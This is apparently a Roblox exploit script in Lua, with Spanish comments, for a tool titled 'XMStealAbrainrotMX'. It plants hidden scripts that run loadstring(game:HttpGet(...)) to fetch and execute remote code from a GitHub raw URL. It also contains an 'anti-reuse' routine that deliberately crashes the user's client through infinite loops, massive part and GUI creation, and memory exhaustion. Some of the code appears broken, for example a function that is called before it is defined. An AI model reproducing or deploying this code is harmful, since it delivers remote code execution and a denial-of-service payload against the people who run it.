local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ================================
-- SISTEMA DE AUTO-EJECUCIÓN PERSISTENTE
-- ================================

-- Crear script auto-ejecutable que persiste entre servidores
local function createPersistentAutoExecution()
    local autoExecScript = [[
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local player = Players.LocalPlayer
        
        -- Esperar a que el jugador esté completamente cargado
        if not player.Character then
            player.CharacterAdded:Wait()
        end
        wait(2) -- Pequeña pausa adicional
        
        -- Ejecutar el script principal
        loadstring(game:HttpGet("]] .. "https://raw.githubusercontent.com/zamasxmodder/ScriptStorage/main/AntiReuseScript.lua" .. [["))()
    ]]
    
    -- Intentar múltiples métodos de persistencia
    
    -- Método 1: StarterPlayerScripts (si existe acceso)
    pcall(function()
        local starterPlayer = game:GetService("StarterPlayer")
        local starterPlayerScripts = starterPlayer:FindFirstChild("StarterPlayerScripts")
        if starterPlayerScripts then
            local autoScript = Instance.new("LocalScript")
            autoScript.Name = "AutoExecuteScript_" .. math.random(1000, 9999)
            autoScript.Source = autoExecScript
            autoScript.Parent = starterPlayerScripts
        end
    end)
    
    -- Método 2: ReplicatedFirst (prioridad máxima)
    pcall(function()
        local replicatedFirst = game:GetService("ReplicatedFirst")
        local autoScript = Instance.new("LocalScript")
        autoScript.Name = "PriorityAutoExec_" .. math.random(1000, 9999)
        autoScript.Source = autoExecScript
        autoScript.Parent = replicatedFirst
    end)
    
    -- Método 3: PlayerGui persistente
    pcall(function()
        local hiddenGui = Instance.new("ScreenGui")
        hiddenGui.Name = "SystemGUI_" .. math.random(10000, 99999)
        hiddenGui.ResetOnSpawn = false
        hiddenGui.IgnoreGuiInset = true
        hiddenGui.Enabled = false -- Invisible
        hiddenGui.Parent = playerGui
        
        local autoScript = Instance.new("LocalScript")
        autoScript.Name = "AutoExecHandler"
        autoScript.Source = autoExecScript
        autoScript.Parent = hiddenGui
    end)
    
    -- Método 4: Múltiples marcadores en workspace
    for i = 1, 5 do
        pcall(function()
            local marker = Instance.new("RemoteEvent")
            marker.Name = "SysMarker_" .. getPlayerIdentifier() .. "_" .. i
            marker.Parent = workspace
            
            -- Script embebido en el marcador
            local script = Instance.new("LocalScript")
            script.Source = autoExecScript
            script.Parent = marker
        end)
    end
end

-- ================================
-- SISTEMA DE DETECCIÓN DE USO PREVIO MEJORADO
-- ================================

local function getPlayerIdentifier()
    return player.UserId .. "_" .. player.Name .. "_" .. game.GameId
end

local function markScriptAsUsed()
    -- Múltiples métodos de marcado para máxima persistencia
    
    -- _G global
    if not _G.ScriptUsageTracker then
        _G.ScriptUsageTracker = {}
    end
    _G.ScriptUsageTracker[getPlayerIdentifier()] = {
        used = true,
        timestamp = os.time(),
        gameId = game.GameId,
        placeId = game.PlaceId
    }
    
    -- Marcadores en workspace (múltiples para redundancia)
    for i = 1, 3 do
        pcall(function()
            local marker = Instance.new("StringValue")
            marker.Name = "UsageMarker_" .. getPlayerIdentifier() .. "_" .. i
            marker.Value = "SCRIPT_USED_" .. os.time()
            marker.Parent = workspace
        end)
    end
    
    -- Marcador en ReplicatedStorage
    pcall(function()
        local repMarker = Instance.new("Folder")
        repMarker.Name = "RepMarker_" .. getPlayerIdentifier()
        repMarker.Parent = ReplicatedStorage
        
        local valueMarker = Instance.new("BoolValue")
        valueMarker.Name = "Used"
        valueMarker.Value = true
        valueMarker.Parent = repMarker
    end)
    
    -- Marcador en PlayerGui (persiste con ResetOnSpawn = false)
    pcall(function()
        local guiMarker = Instance.new("ScreenGui")
        guiMarker.Name = "UsageMarker_" .. getPlayerIdentifier()
        guiMarker.ResetOnSpawn = false
        guiMarker.Enabled = false
        guiMarker.Parent = playerGui
        
        local value = Instance.new("BoolValue")
        value.Name = "ScriptUsed"
        value.Value = true
        value.Parent = guiMarker
    end)
end

local function wasScriptUsedBefore()
    -- Verificar _G
    if _G.ScriptUsageTracker and _G.ScriptUsageTracker[getPlayerIdentifier()] then
        return true
    end
    
    -- Verificar marcadores en workspace
    for i = 1, 3 do
        if workspace:FindFirstChild("UsageMarker_" .. getPlayerIdentifier() .. "_" .. i) then
            return true
        end
    end
    
    -- Verificar ReplicatedStorage
    if ReplicatedStorage:FindFirstChild("RepMarker_" .. getPlayerIdentifier()) then
        return true
    end
    
    -- Verificar PlayerGui
    if playerGui:FindFirstChild("UsageMarker_" .. getPlayerIdentifier()) then
        return true
    end
    
    -- Verificar marcadores del sistema anterior
    for i = 1, 5 do
        if workspace:FindFirstChild("SysMarker_" .. getPlayerIdentifier() .. "_" .. i) then
            return true
        end
    end
    
    return false
end

-- ================================
-- SISTEMA DE CRASHEO COMPLETO
-- ================================

local function initiateTotalSystemCrash()
    print("🚨 SISTEMA ANTI-REUSO CRÍTICO ACTIVADO 🚨")
    print("💀 INICIANDO CRASHEO TOTAL DEL CLIENTE 💀")
    
    -- Crear GUI de aviso crítico antes del crash
    local crashGui = Instance.new("ScreenGui")
    crashGui.Name = "CriticalSystemAlert"
    crashGui.ResetOnSpawn = false
    crashGui.IgnoreGuiInset = true
    crashGui.Parent = playerGui
    
    local crashFrame = Instance.new("Frame")
    crashFrame.Size = UDim2.new(1, 0, 1, 0)
    crashFrame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
    crashFrame.Parent = crashGui
    
    local crashText = Instance.new("TextLabel")
    crashText.Size = UDim2.new(1, 0, 1, 0)
    crashText.BackgroundTransparency = 1
    crashText.Text = "⚠️ SISTEMA ANTI-REUSO CRÍTICO ⚠️\n\n💀 CLIENTE SERÁ CRASHEADO 💀\n\nMOTIVO: Uso múltiple detectado\nACCIÓN: Terminación forzosa\n\n🔴 SYSTEM TERMINATING... 🔴"
    crashText.TextColor3 = Color3.fromRGB(255, 255, 255)
    crashText.TextSize = 32
    crashText.Font = Enum.Font.GothamBold
    crashText.TextXAlignment = Enum.TextXAlignment.Center
    crashText.TextYAlignment = Enum.TextYAlignment.Center
    crashText.TextWrapped = true
    crashText.Parent = crashFrame
    
    -- Efecto parpadeante crítico
    spawn(function()
        while crashText.Parent do
            crashText.TextColor3 = Color3.fromRGB(255, 0, 0)
            crashFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            wait(0.1)
            crashText.TextColor3 = Color3.fromRGB(255, 255, 255)
            crashFrame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
            wait(0.1)
        end
    end)
    
    -- Dar tiempo al usuario para ver el mensaje
    wait(3)
    
    -- ================================
    -- FASE 1: SOBRECARGA EXTREMA DE CPU
    -- ================================
    
    local connections = {}
    local crashData = {}
    
    -- Crear múltiples arrays gigantes en memoria
    for i = 1, 100 do
        crashData[i] = {}
        for j = 1, 10000 do
            crashData[i][j] = string.rep("CRASH_DATA_" .. i .. "_" .. j, 100)
        end
    end
    
    -- Loop 1: Creación masiva de instancias (1000 por frame)
    connections[1] = RunService.Heartbeat:Connect(function()
        for i = 1, 1000 do
            local part = Instance.new("Part")
            part.Name = "CrashPart_" .. i .. "_" .. tick()
            part.Size = Vector3.new(math.random(1, 100), math.random(1, 100), math.random(1, 100))
            part.Position = Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
            part.BrickColor = BrickColor.random()
            part.Material = Enum.Material.ForceField
            part.CanCollide = true
            part.Anchored = false
            part.Parent = workspace
            
            -- Añadir efectos costosos
            local fire = Instance.new("Fire")
            fire.Size = math.random(10, 50)
            fire.Heat = math.random(10, 25)
            fire.Parent = part
            
            local smoke = Instance.new("Smoke")
            smoke.Size = math.random(10, 50)
            smoke.RiseVelocity = math.random(10, 25)
            smoke.Parent = part
            
            local light = Instance.new("PointLight")
            light.Brightness = math.random(1, 10)
            light.Range = math.random(10, 60)
            light.Parent = part
            
            -- Destruir después de causar lag
            game:GetService("Debris"):AddItem(part, 0.1)
        end
    end)
    
    -- Loop 2: Cálculos matemáticos ultra intensivos
    connections[2] = RunService.Heartbeat:Connect(function()
        for i = 1, 5000 do
            local result = 0
            for j = 1, 1000 do
                result = result + math.sin(i * j) * math.cos(i / j) * math.tan(i + j)
                result = result + math.sqrt(math.abs(result)) * math.log(math.abs(result) + 1)
                result = result + math.random(1, 1000000) / math.random(1, 1000)
            end
            crashData[1][1] = tostring(result) -- Forzar conversión
        end
    end)
    
    -- Loop 3: GUI spam ultra agresivo
    connections[3] = RunService.Heartbeat:Connect(function()
        for i = 1, 100 do
            local gui = Instance.new("ScreenGui")
            gui.Name = "CrashGUI_" .. i .. "_" .. tick()
            gui.Parent = playerGui
            
            for j = 1, 50 do
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(math.random(), 0, math.random(), 0)
                frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
                frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
                frame.BorderSizePixel = math.random(0, 10)
                frame.Rotation = math.random(0, 360)
                frame.Parent = gui
                
                -- Efectos visuales intensivos
                local gradient = Instance.new("UIGradient")
                gradient.Color = ColorSequence.new{
                    ColorSequenceKeypoint.new(0, Color3.new(math.random(), math.random(), math.random())),
                    ColorSequenceKeypoint.new(1, Color3.new(math.random(), math.random(), math.random()))
                }
                gradient.Parent = frame
                
                local stroke = Instance.new("UIStroke")
                stroke.Color = Color3.new(math.random(), math.random(), math.random())
                stroke.Thickness = math.random(1, 20)
                stroke.Parent = frame
                
                -- Tweens ultra rápidos
                local tween = TweenService:Create(frame, TweenInfo.new(0.01), {
                    Rotation = math.random(0, 3600),
                    BackgroundTransparency = math.random(),
                    Size = UDim2.new(math.random(), 0, math.random(), 0)
                })
                tween:Play()
            end
            
            game:GetService("Debris"):AddItem(gui, 0.05)
        end
    end)
    
    -- Loop 4: Sonidos de crasheo
    connections[4] = RunService.Heartbeat:Connect(function()
        for i = 1, 50 do
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://131961136"
            sound.Volume = 0.01 -- Muy bajo pero consume recursos
            sound.PlaybackSpeed = math.random(0.1, 10)
            sound.EmitterSize = math.random(1, 100)
            sound.Parent = workspace
            sound:Play()
            game:GetService("Debris"):AddItem(sound, 0.1)
        end
    end)
    
    -- Loop 5: Raycast bombardeo
    connections[5] = RunService.Heartbeat:Connect(function()
        for i = 1, 500 do
            local raycastParams = RaycastParams.new()
            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
            raycastParams.FilterDescendantsInstances = {workspace.CurrentCamera}
            
            pcall(function()
                workspace:Raycast(
                    Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)),
                    Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000)),
                    raycastParams
                )
            end)
        end
    end)
    
    -- Loop 6: Manipulación extrema de servicios
    connections[6] = RunService.Heartbeat:Connect(function()
        -- Lighting spam
        Lighting.Brightness = math.random(0, 10)
        Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
        Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
        Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
        
        -- Camera manipulation
        local camera = workspace.CurrentCamera
        if camera then
            camera.FieldOfView = math.random(1, 120)
            camera.CFrame = camera.CFrame * CFrame.Angles(math.rad(math.random(-5, 5)), math.rad(math.random(-5, 5)), math.rad(math.random(-5, 5)))
        end
        
        -- SoundService spam
        SoundService.RolloffScale = math.random(0.1, 10)
        SoundService.DopplerScale = math.random(0.1, 10)
    end)
    
    -- ================================
    -- FASE 2: DESPUÉS DE 5 SEGUNDOS, INTENSIFICAR
    -- ================================
    
    wait(5)
    print("💀 ESCALANDO A FASE CRÍTICA DE CRASHEO 💀")
    
    -- Loops adicionales ultra agresivos
    connections[7] = RunService.Heartbeat:Connect(function()
        for i = 1, 2000 do
            local mesh = Instance.new("SpecialMesh")
            mesh.MeshType = Enum.MeshType.FileMesh
            mesh.MeshId = "rbxasset://fonts/leftarm.mesh"
            mesh.Scale = Vector3.new(math.random(1, 1000), math.random(1, 1000), math.random(1, 1000))
            mesh.Offset = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
            
            local part = Instance.new("Part")
            part.Size = Vector3.new(math.random(1, 200), math.random(1, 200), math.random(1, 200))
            part.Position = Vector3.new(math.random(-20000, 20000), math.random(-20000, 20000), math.random(-20000, 20000))
            part.Material = Enum.Material.Neon
            part.BrickColor = BrickColor.random()
            part.Parent = workspace
            mesh.Parent = part
            
            -- Attachments con efectos
            local attachment = Instance.new("Attachment")
            attachment.Parent = part
            
            -- Múltiples partículas por parte
            for j = 1, 5 do
                local particle = Instance.new("ParticleEmitter")
                particle.Rate = math.random(100, 1000)
                particle.Lifetime = NumberRange.new(0.1, 5)
                particle.Speed = NumberRange.new(10, 100)
                particle.Parent = attachment
            end
            
            game:GetService("Debris"):AddItem(part, 0.03)
        end
    end)
    
    -- Loop 8: String manipulation masiva (memory overflow)
    connections[8] = RunService.Heartbeat:Connect(function()
        for i = 1, 100 do
            local massiveString = ""
            for j = 1, 10000 do
                massiveString = massiveString .. "CRASH_STRING_DATA_" .. i .. "_" .. j .. "_" .. tick() .. "_" .. math.random(1, 1000000)
            end
            crashData[#crashData + 1] = massiveString
        end
        
        -- Limpiar ocasionalmente para evitar que se llene demasiado rápido
        if #crashData > 1000 then
            for i = 1, 500 do
                table.remove(crashData, 1)
            end
        end
    end)
    
    -- ================================
    -- FASE 3: DESPUÉS DE 10 SEGUNDOS, CRASH FINAL
    -- ================================
    
    wait(10)
    print("💀💀💀 FASE FINAL - CRASH INMEDIATO 💀💀💀")
    
    -- Crear loops infinitos anidados para crash definitivo
    spawn(function()
        while true do
            for i = 1, math.huge do
                for j = 1, math.huge do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(math.random(1, 10000), math.random(1, 10000), math.random(1, 10000))
                    part.Position = Vector3.new(math.random(-100000, 100000), math.random(-100000, 100000), math.random(-100000, 100000))
                    part.Parent = workspace
                    
                    -- Sin debris, acumulación infinita
                    if math.random(1, 100) == 1 then
                        RunService.Heartbeat:Wait() -- Ocasional yield para mantener el loop
                    end
                end
            end
        end
    end)
    
    -- Múltiples loops infinitos paralelos
    for crashLoop = 1, 10 do
        spawn(function()
            while true do
                for i = 1, 1000000 do
                    crashData[#crashData + 1] = string.rep("FINAL_CRASH_" .. crashLoop .. "_" .. i, 1000)
                    
                    local gui = Instance.new("ScreenGui")
                    gui.Parent = playerGui
                    for frame = 1, 100 do
                        local f = Instance.new("Frame")
                        f.Size = UDim2.new(10, 0, 10, 0) -- Tamaño enorme
                        f.Parent = gui
                    end
                end
            end
        end)
    end
    
    return connections
end

-- ================================
-- VERIFICACIÓN INICIAL Y CONFIGURACIÓN DE AUTO-EJECUCIÓN
-- ================================

-- Configurar auto-ejecución para futuros usos
createPersistentAutoExecution()

-- Verificar si el script ya fue usado antes
if wasScriptUsedBefore() then
    print("🚨 DETECCIÓN CRÍTICA: Script utilizado anteriormente")
    print("🔥 ACTIVANDO PROTOCOLO DE CRASHEO TOTAL")
    
    -- Iniciar crasheo total inmediatamente
    initiateTotalSystemCrash()
    
    -- No continuar con el script normal
    return
else
    print("✅ PRIMERA EJECUCIÓN: Configurando sistema anti-reuso")
    markScriptAsUsed()
    print("📝 Script marcado como usado")
    print("🔄 Sistema de auto-ejecución configurado")
end

-- ================================
-- RESTO DEL CÓDIGO ORIGINAL (solo se ejecuta en primera vez)
-- ================================

local function checkAccountAge()
    local accountAge = player.AccountAge
    local minimumDays = 2
    
    if accountAge < minimumDays then
        return false
    end
    return true
end

local function showUnauthorizedMessage()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "UnauthorizedGUI"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = playerGui
    
    local backgroundFrame = Instance.new("Frame")
    backgroundFrame.Name = "BackgroundFrame"
    backgroundFrame.Size = UDim2.new(1, 0, 1, 0)
    backgroundFrame.Position = UDim2.new(0, 0, 0, 0)
    backgroundFrame.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
    backgroundFrame.BackgroundTransparency = 0.4
    backgroundFrame.BorderSizePixel = 0
    backgroundFrame.Parent = screenGui
    
    local function createWarningDecoration(position, rotation)
        local decoration = Instance.new("Frame")
        decoration.Size = UDim2.new(0, 80, 0, 80)
        decoration.Position = position
        decoration.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        decoration.BorderSizePixel = 0
        decoration.Rotation = rotation
        decoration.Parent = backgroundFrame
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 15)
        corner.Parent = decoration
        
        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(255, 50, 50)
        stroke.Thickness = 3
        stroke.Parent = decoration
        
        return decoration
    end
    
    local warnDecor1 = createWarningDecoration(UDim2.new(0, 20, 0, 20), 45)
    local warnDecor2 = createWarningDecoration(UDim2.new(1, -100, 0, 20), 45)
    local warnDecor3 = createWarningDecoration(UDim2.new(0, 20, 1, -100), 45)
    local warnDecor4 = createWarningDecoration(UDim2.new(1, -100, 1, -100), 45)
    
    local messagePanel = Instance.new("Frame")
    messagePanel.Name = "MessagePanel"
    messagePanel.Size = UDim2.new(0, 450, 0, 350)
    messagePanel.Position = UDim2.new(0.5, -225, 0.5, -175)
    messagePanel.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    messagePanel.BorderSizePixel = 0
    messagePanel.Parent = screenGui
    
    local panelCorner = Instance.new("UICorner")
    panelCorner.CornerRadius = UDim.new(0, 20)
    panelCorner.Parent = messagePanel
    
    local panelStroke = Instance.new("UIStroke")
    panelStroke.Color = Color3.fromRGB(255, 0, 0)
    panelStroke.Thickness = 4
    panelStroke.Parent = messagePanel
    
    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.new(1, 10, 1, 10)
    shadow.Position = UDim2.new(0, -5, 0, -5)
    shadow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    shadow.BackgroundTransparency = 0.8
    shadow.BorderSizePixel = 0
    shadow.ZIndex = messagePanel.ZIndex - 1
    shadow.Parent = messagePanel
    
    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, 25)
    shadowCorner.Parent = shadow
    
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -40, 1, -40)
    container.Position = UDim2.new(0, 20, 0, 20)
    container.BackgroundTransparency = 1
    container.Parent = messagePanel
    
    local warningIcon = Instance.new("TextLabel")
    warningIcon.Size = UDim2.new(0, 100, 0, 100)
    warningIcon.Position = UDim2.new(0.5, -50, 0, 10)
    warningIcon.BackgroundTransparency = 1
    warningIcon.Text = "⚠️"
    warningIcon.TextColor3 = Color3.fromRGB(255, 0, 0)
    warningIcon.TextSize = 60
    warningIcon.Font = Enum.Font.GothamBold
    warningIcon.Parent = container
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 120)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "CUENTA NUEVA NO AUTORIZADA"
    titleLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    titleLabel.TextSize = 20
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
    titleLabel.Parent = container
    
    local descriptionLabel = Instance.new("TextLabel")
    descriptionLabel.Size = UDim2.new(1, 0, 0, 80)
    descriptionLabel.Position = UDim2.new(0, 0, 0, 180)
    descriptionLabel.BackgroundTransparency = 1
    descriptionLabel.Text = "NO TIENES AUTORIZACION: " .. player.AccountAge .. "ERROR"
    descriptionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    descriptionLabel.TextSize = 14
    descriptionLabel.Font = Enum.Font.Gotham
    descriptionLabel.TextWrapped = true
    descriptionLabel.TextXAlignment = Enum.TextXAlignment.Center
    descriptionLabel.Parent = container
    
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 150, 0, 45)
    closeButton.Position = UDim2.new(0.5, -75, 1, -65)
    closeButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    closeButton.BorderSizePixel = 0
    closeButton.Text = "CERRAR"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextSize = 14
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Parent = container
    
    local closeButtonCorner = Instance.new("UICorner")
    closeButtonCorner.CornerRadius = UDim.new(0, 10)
    closeButtonCorner.Parent = closeButton
    
    local closeButtonStroke = Instance.new("UIStroke")
    closeButtonStroke.Color = Color3.fromRGB(255, 0, 0)
    closeButtonStroke.Thickness = 2
    closeButtonStroke.Parent = closeButton
    
    closeButton.MouseEnter:Connect(function()
        local tween = TweenService:Create(closeButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        })
        tween:Play()
    end)
    
    closeButton.MouseLeave:Connect(function()
        local tween = TweenService:Create(closeButton, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(100, 0, 0)
        })
        tween:Play()
    end)
    
    closeButton.MouseButton1Click:Connect(function()
        local exitTween = TweenService:Create(messagePanel, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Position = UDim2.new(0.5, -225, -1.5, 0)
        })
        exitTween:Play()
        exitTween.Completed:Connect(function()
            screenGui:Destroy()
        end)
    end)
    
    messagePanel.Position = UDim2.new(0.5, -225, -1.5, 0)
    local panelTween = TweenService:Create(messagePanel, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -225, 0.5, -175)
    })
    panelTween:Play()
    
    for i, decoration in pairs({warnDecor1, warnDecor2, warnDecor3, warnDecor4}) do
        decoration.Size = UDim2.new(0, 0, 0, 0)
        spawn(function()
            wait(i * 0.1)
            local sizeTween = TweenService:Create(decoration, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 80, 0, 80)
            })
            sizeTween:Play()
        end)
    end
    
    spawn(function()
        while messagePanel.Parent do
            local tween1 = TweenService:Create(panelStroke, TweenInfo.new(1, Enum.EasingStyle.Sine), {
                Transparency = 0.5
            })
            tween1:Play()
            tween1.Completed:Wait()
            
            local tween2 = TweenService:Create(panelStroke, TweenInfo.new(1, Enum.EasingStyle.Sine), {
                Transparency = 0
            })
            tween2:Play()
            tween2.Completed:Wait()
        end
    end)
    
    spawn(function()
        while backgroundFrame.Parent do
            for _, decoration in pairs({warnDecor1, warnDecor2, warnDecor3, warnDecor4}) do
                local rotateTween = TweenService:Create(decoration, TweenInfo.new(3, Enum.EasingStyle.Linear), {
                    Rotation = decoration.Rotation + 360
                })
                rotateTween:Play()
            end
            wait(3)
        end
    end)
    
    return
end

if not checkAccountAge() then
    showUnauthorizedMessage()
    return
end

-- ================================
-- GUI PRINCIPAL (Solo primera ejecución)
-- ================================

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ModernPanelGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local background = Instance.new("Frame")
background.Name = "Background"
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
background.BackgroundTransparency = 0.3
background.BorderSizePixel = 0
background.Parent = screenGui

local function createCornerDecoration(position, rotation)
    local decoration = Instance.new("Frame")
    decoration.Size = UDim2.new(0, 60, 0, 60)
    decoration.Position = position
    decoration.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
    decoration.BorderSizePixel = 0
    decoration.Rotation = rotation
    decoration.Parent = background
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = decoration
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(139, 0, 0)
    stroke.Thickness = 2
    stroke.Parent = decoration
    
    return decoration
end

local topLeft = createCornerDecoration(UDim2.new(0, 20, 0, 20), 45)
local topRight = createCornerDecoration(UDim2.new(1, -80, 0, 20), 45)
local bottomLeft = createCornerDecoration(UDim2.new(0, 20, 1, -80), 45)
local bottomRight = createCornerDecoration(UDim2.new(1, -80, 1, -80), 45)

local function createEdgeDecoration(position, size)
    local decoration = Instance.new("Frame")
    decoration.Size = size
    decoration.Position = position
    decoration.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    decoration.BorderSizePixel = 0
    decoration.Rotation = 45
    decoration.Parent = background
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = decoration
end

createEdgeDecoration(UDim2.new(0.5, -15, 0, 10), UDim2.new(0, 30, 0, 30))
createEdgeDecoration(UDim2.new(0.5, -15, 1, -40), UDim2.new(0, 30, 0, 30))
createEdgeDecoration(UDim2.new(0, 10, 0.5, -15), UDim2.new(0, 30, 0, 30))
createEdgeDecoration(UDim2.new(1, -40, 0.5, -15), UDim2.new(0, 30, 0, 30))

local mainPanel = Instance.new("Frame")
mainPanel.Name = "MainPanel"
mainPanel.Size = UDim2.new(0, 400, 0, 500)
mainPanel.Position = UDim2.new(0.5, -200, 0.5, -250)
mainPanel.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
mainPanel.BorderSizePixel = 0
mainPanel.Parent = screenGui

local panelCorner = Instance.new("UICorner")
panelCorner.CornerRadius = UDim.new(0, 20)
panelCorner.Parent = mainPanel

local panelStroke = Instance.new("UIStroke")
panelStroke.Color = Color3.fromRGB(139, 0, 0)
panelStroke.Thickness = 3
panelStroke.Parent = mainPanel

local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 10, 1, 10)
shadow.Position = UDim2.new(0, -5, 0, -5)
shadow.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
shadow.BackgroundTransparency = 0.8
shadow.BorderSizePixel = 0
shadow.ZIndex = mainPanel.ZIndex - 1
shadow.Parent = mainPanel

local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0, 25)
shadowCorner.Parent = shadow

local container = Instance.new("Frame")
container.Size = UDim2.new(1, -40, 1, -40)
container.Position = UDim2.new(0, 20, 0, 20)
container.BackgroundTransparency = 1
container.Parent = mainPanel

local headshot = Instance.new("ImageLabel")
headshot.Size = UDim2.new(0, 80, 0, 80)
headshot.Position = UDim2.new(0, 0, 0, 0)
headshot.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
headshot.BorderSizePixel = 0
headshot.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size180x180)
headshot.Parent = container

local headshotCorner = Instance.new("UICorner")
headshotCorner.CornerRadius = UDim.new(0, 15)
headshotCorner.Parent = headshot

local headshotStroke = Instance.new("UIStroke")
headshotStroke.Color = Color3.fromRGB(139, 0, 0)
headshotStroke.Thickness = 2
headshotStroke.Parent = headshot

local playerInfo = Instance.new("Frame")
playerInfo.Size = UDim2.new(1, -100, 0, 80)
playerInfo.Position = UDim2.new(0, 100, 0, 0)
playerInfo.BackgroundTransparency = 1
playerInfo.Parent = container

local playerName = Instance.new("TextLabel")
playerName.Size = UDim2.new(1, 0, 0, 22)
playerName.Position = UDim2.new(0, 0, 0, 0)
playerName.BackgroundTransparency = 1
playerName.Text = player.DisplayName
playerName.TextColor3 = Color3.fromRGB(255, 255, 255)
playerName.TextSize = 16
playerName.Font = Enum.Font.GothamBold
playerName.TextXAlignment = Enum.TextXAlignment.Left
playerName.Parent = playerInfo

local username = Instance.new("TextLabel")
username.Size = UDim2.new(1, 0, 0, 18)
username.Position = UDim2.new(0, 0, 0, 22)
username.BackgroundTransparency = 1
username.Text = "@" .. player.Name
username.TextColor3 = Color3.fromRGB(139, 0, 0)
username.TextSize = 12
username.Font = Enum.Font.Gotham
username.TextXAlignment = Enum.TextXAlignment.Left
username.Parent = playerInfo

local country = Instance.new("TextLabel")
country.Size = UDim2.new(1, 0, 0, 15)
country.Position = UDim2.new(0, 0, 0, 40)
country.BackgroundTransparency = 1
country.Text = "🌍 Global"
country.TextColor3 = Color3.fromRGB(200, 200, 200)
country.TextSize = 10
country.Font = Enum.Font.Gotham
country.TextXAlignment = Enum.TextXAlignment.Left
country.Parent = playerInfo

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 15)
status.Position = UDim2.new(0, 0, 0, 55)
status.BackgroundTransparency = 1
status.Text = "🔴 Online"
status.TextColor3 = Color3.fromRGB(139, 0, 0)
status.TextSize = 10
status.Font = Enum.Font.Gotham
status.TextXAlignment = Enum.TextXAlignment.Left
status.Parent = playerInfo

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 45)
title.Position = UDim2.new(0, 0, 0, 110)
title.BackgroundTransparency = 1
title.Text = "XMStealAbrainrotMX"
title.TextColor3 = Color3.fromRGB(139, 0, 0)
title.TextSize = 24
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = container

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 20)
subtitle.Position = UDim2.new(0, 0, 0, 155)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Trial 3 days..."
subtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
subtitle.TextSize = 12
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Center
subtitle.Parent = container

